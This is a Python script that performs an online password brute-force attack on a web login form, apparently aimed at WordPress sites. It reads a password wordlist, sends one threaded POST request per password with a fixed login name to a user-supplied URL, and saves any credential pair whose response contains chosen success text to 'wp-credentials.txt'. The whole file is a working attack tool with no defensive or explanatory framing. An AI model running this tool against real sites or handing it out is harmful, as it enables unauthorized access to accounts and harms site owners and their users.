
from optparse import OptionParser
from http.client import HTTPSConnection, HTTPConnection
from urllib.parse import urlencode
from threading import Thread
from os import system
from sys import exit

parser = OptionParser()

arguments = [

    { 'argument': ['-u', '--url'], 'dest': 'target_url', 'type': 'string', 'help': None },
    { 'argument': ['-p', '--protocol'], 'dest': 'protocol', 'type': 'string', 'help': None },
    { 'argument': ['-l', '--pattern-login'], 'dest': 'pattern_login', 'type': 'string', 'help': None },
    { 'argument': ['-w', '--wordlist'], 'dest': 'wordlist', 'type': 'string', 'help': None },
    { 'argument': ['-t', '--texts-to-verify'], 'dest': 'texts_to_verify', 'type': 'string', 'help': None },
    { 'argument': ['-a', '--additionals'], 'dest': 'additionals', 'type': 'string', 'help': None }

]

for argument in arguments:
    parser.add_option(argument['argument'][0], argument['argument'][1], dest=argument['dest'], type=argument['type'], help=argument['help'])

(options, args) = parser.parse_args()

(target_url, protocol, pattern_login, wordlist, texts_to_verify, additionals) = (options.target_url, options.protocol, options.pattern_login, options.wordlist, options.texts_to_verify, options.additionals)

necessary_arguments = True

for argument in [target_url, protocol, pattern_login, wordlist, texts_to_verify, additionals]:
    if (argument is None):
        necessary_arguments = False; break

if (necessary_arguments is False):
    exit('\n! Required arguments were not passed\n\n-u, --url\n-p, --protocol\n-l, --pattern-login\n-w, --wordlist\n-t, --texts-to-verify\n-a, --additionals')

def brute(passwords):

    for password in passwords:
        print('\n* Testing the following credentials: %s and %s\n' % (pattern_login, password))

        Thread(target=test_credentials, args=(pattern_login, password,)).start()

        system('cls'); continue

def test_credentials(login, password):

    connection = None

    try:

        if (protocol == 'http'): 
            connection = HTTPConnection(target_url) 
        else: 
            connection = HTTPSConnection(target_url)

        as_sp = additionals.split('~')

        connection.request('POST', as_sp[0], urlencode({ as_sp[1]: login, as_sp[2]: password.encode('utf-8') }))

        response = connection.getresponse().read().decode()

        txts_to_verify = texts_to_verify.split('~')

        for txt_to_verify in txts_to_verify:

            if (txt_to_verify in response):
                with open('wp-credentials.txt', 'w') as w: w.write('%s~%s' % (login, password)); break
    
    except Exception as exception:
        print('! Failure: %s' % (str(exception)))

if (__name__ == '__main__'):
    
    passwords = []

    with open(wordlist, 'r', encoding='latin-1') as r:
        for password in r.readlines(): passwords.append(password.strip('\n'))

    brute(passwords)